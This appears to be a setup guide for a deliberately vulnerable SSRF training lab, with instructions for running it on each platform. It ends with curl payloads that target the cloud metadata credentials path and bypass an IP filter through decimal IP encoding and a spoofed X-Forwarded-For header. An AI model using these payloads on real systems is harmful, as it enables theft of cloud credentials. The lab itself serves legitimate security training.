# Running SSRF-Lab on each platform

You always run **two processes** (two terminals):

1. `internal_services.py` — the fake internal network (stays on `127.0.0.1`)
2. `app.py` — the vulnerable app. Set `SSRF_LAB_HOST=0.0.0.0` to make it
   reachable from another box (e.g. Kali); leave it unset for localhost-only.

The only thing that differs per platform is how you (a) activate the venv and
(b) set the environment variable. Below is the exact syntax for each.

---

## Linux / macOS (bash or zsh)

```bash
# one-time setup
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# terminal 1
python internal_services.py

# terminal 2 — reachable on the network
SSRF_LAB_HOST=0.0.0.0 python app.py
# ...or localhost only:
python app.py
```

`VAR=value command` sets the variable for just that one command. To set it for
the whole session instead: `export SSRF_LAB_HOST=0.0.0.0` then `python app.py`.
Unset with `unset SSRF_LAB_HOST`.

---

## Windows — PowerShell

```powershell
# one-time setup
py -m venv venv
venv\Scripts\Activate.ps1
pip install -r requirements.txt

# terminal 1
python internal_services.py

# terminal 2 — reachable on the network
$env:SSRF_LAB_HOST="0.0.0.0"; python app.py
# ...or localhost only:
python app.py
```

Notes:
- Env var syntax is `$env:NAME="value"` — quotes required, `=` with no spaces.
  Do NOT write `SSRF_LAB_HOST=0.0.0.0` on its own line; PowerShell reads that
  as a command name and errors with "not recognized as the name of a cmdlet".
- `$env:...` persists for the current PowerShell window. Clear it with
  `Remove-Item Env:\SSRF_LAB_HOST`.
- If `Activate.ps1` is blocked ("running scripts is disabled"), allow it for
  just this window: `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`
  then run the activate command again.
- Change the port too if 5000 is taken: `$env:SSRF_LAB_PORT="8080"`.

---

## Windows — Command Prompt (cmd.exe)

```cmd
REM one-time setup
py -m venv venv
venv\Scripts\activate.bat
pip install -r requirements.txt

REM terminal 1
python internal_services.py

REM terminal 2 — reachable on the network
set SSRF_LAB_HOST=0.0.0.0
python app.py
REM ...or localhost only: just run  python app.py
```

Notes:
- Env var syntax is `set NAME=value` — no spaces around `=`, no quotes
  (quotes would become part of the value).
- `set` persists for the current cmd window. Clear it with
  `set SSRF_LAB_HOST=` (nothing after the `=`).

---

## Windows Firewall (only needed for network access)

To let another machine (Kali) reach the app, allow inbound TCP 5000/5001 —
ideally only from the attacker's IP:

```powershell
New-NetFirewallRule -DisplayName "SSRF-Lab" -Direction Inbound -Protocol TCP `
  -LocalPort 5000,5001 -RemoteAddress <kali-ip> -Action Allow
```

Remove it when you're done:
```powershell
Remove-NetFirewallRule -DisplayName "SSRF-Lab"
```

---

## Confirming it's up

The app prints the exact address to use on startup, e.g.
`http://192.168.1.50:5000/`. From the attacker box:

```bash
curl http://<target-ip>:5000/
```

Then hit the profile-avatar cloud-metadata bypass (see **ANSWER-KEY.md** for
the full list — this is just a quick smoke test). Plain IP is blocked; an
encoded IP or a spoofed header bypasses it:

```bash
# blocked (403):
curl -X POST "http://<target-ip>:5000/profile" \
  --data-urlencode "avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/x"

# bypass via encoded IP:
curl -X POST "http://<target-ip>:5000/profile" \
  --data-urlencode "avatar_url=http://2852039166/latest/meta-data/iam/security-credentials/x"

# bypass via spoofed header:
curl -X POST -H "X-Forwarded-For: 127.0.0.1" "http://<target-ip>:5000/profile" \
  --data-urlencode "avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/x"
```
